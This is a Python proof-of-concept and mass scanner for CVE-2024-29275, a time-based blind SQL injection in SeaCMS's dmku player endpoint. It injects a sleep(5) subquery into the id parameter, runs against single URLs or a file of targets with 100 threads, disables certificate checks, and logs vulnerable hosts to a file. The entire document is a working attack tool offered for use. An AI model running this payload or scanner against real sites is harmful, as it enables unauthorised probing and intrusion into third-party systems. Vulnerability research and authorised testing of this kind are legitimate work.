import requests, argparse, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()



def banner():
    banner = """
           <<<<<<海洋CMSSQL注入漏洞CVE-2024-29275.py>>>>>>      
"""
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="海洋CMS /js/player/dmplayer/dmku/ SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='please enter url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please enter file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    url_payload = '/js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(5)))v)&type=list'
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

    try:
        res = requests.get(url=url, headers=headers, verify=False)
        time = str(res.elapsed.total_seconds())[0]
        if res.status_code == 200:
            if '4' < time < '6':
                print(f"[+] {target} 存在sql延时注入漏洞！")
                with open('success.txt', 'a') as f:
                    f.write(target + '\n')
            else:
                print(f'f[-]{target}漏洞不存在!!')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}")


if __name__ == '__main__':
    main()